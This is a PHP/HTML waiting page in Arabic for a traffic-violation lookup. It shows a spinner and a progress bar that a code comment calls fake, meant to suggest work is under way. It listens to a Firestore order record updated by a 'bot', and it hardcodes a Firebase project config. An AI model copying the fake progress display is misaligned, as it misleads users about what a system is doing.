<?php
// تأكد أن الملف بامتداد .php ليعمل مع Vercel Runtime
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جاري التحقق من المخالفات...</title>
    <style>
        :root { --main-green: #008b47; }
        body {
            margin: 0; padding: 0;
            background-color: #f4f7f6;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }
        .loading-container { text-align: center; padding: 20px; }
        .spinner {
            width: 60px; height: 60px;
            border: 6px solid #ddd;
            border-top: 6px solid var(--main-green);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { color: #333; font-size: 20px; font-weight: 600; margin-bottom: 10px; }
        .sub-text { color: #6e6e6e; font-size: 15px; }
        
        /* شريط تقدم وهمي لإعطاء انطباع بالعمل */
        .progress-bar {
            width: 200px;
            height: 6px;
            background: #eee;
            border-radius: 3px;
            margin: 20px auto;
            overflow: hidden;
            position: relative;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: var(--main-green);
            animation: grow 15s ease-in-out forwards;
        }
        @keyframes grow { from { width: 0%; } to { width: 95%; } }
    </style>
</head>
<body>

    <div class="loading-container">
        <div class="spinner"></div>
        <div class="text">جاري الاتصال بالنظام المركزي...</div>
        <div class="sub-text">يرجى الانتظار، يتم الآن سحب بيانات اللوحة</div>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="sub-text" id="status-msg">يتم التحقق من قاعدة البيانات...</div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

    <script>
        // إعدادات Firebase (نفس التي استخدمناها في index.php)
        const firebaseConfig = {
            apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
            authDomain: "jusour-qatar.firebaseapp.com",
            projectId: "jusour-qatar",
            storageBucket: "jusour-qatar.appspot.com",
            messagingSenderId: "927435762624",
            appId: "1:927435762624:web:11d0bf460b62e4af9db625"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // الحصول على معرف الطلب من التخزين المؤقت
        const orderId = sessionStorage.getItem("last_order_id");

        if (!orderId) {
            // إذا لم يوجد طلب، ارجع للرئيسية
            window.location.href = "index.php";
        } else {
            // مراقبة الطلب في Firebase لحظة بلحظة (Real-time)
            const unsubscribe = db.collection("orders").doc(orderId)
                .onSnapshot((doc) => {
                    if (doc.exists) {
                        const data = doc.data();
                        const status = data.status;

                        // تحديث الرسائل للمستخدم بناءً على حالة البوت
                        if (status === "processing") {
                            document.getElementById("status-msg").innerText = "تم العثور على اللوحة، جاري حساب المخالفات...";
                        }

                        // إذا تغيرت الحالة إلى "success" (يعني البوت خلص سحب)
                        if (status === "success") {
                            unsubscribe(); // أوقف المراقبة
                            window.location.href = "violations_view.php"; // انتقل لصفحة النتائج
                        }
                        
                        // في حالة وجود خطأ من الرادار
                        if (status === "error") {
                            alert("عذراً، لم يتم العثور على بيانات لهذه اللوحة. يرجى التأكد والمحاولة لاحقاً.");
                            window.location.href = "index.php";
                        }
                    }
                });
        }
    </script>
</body>
</html>
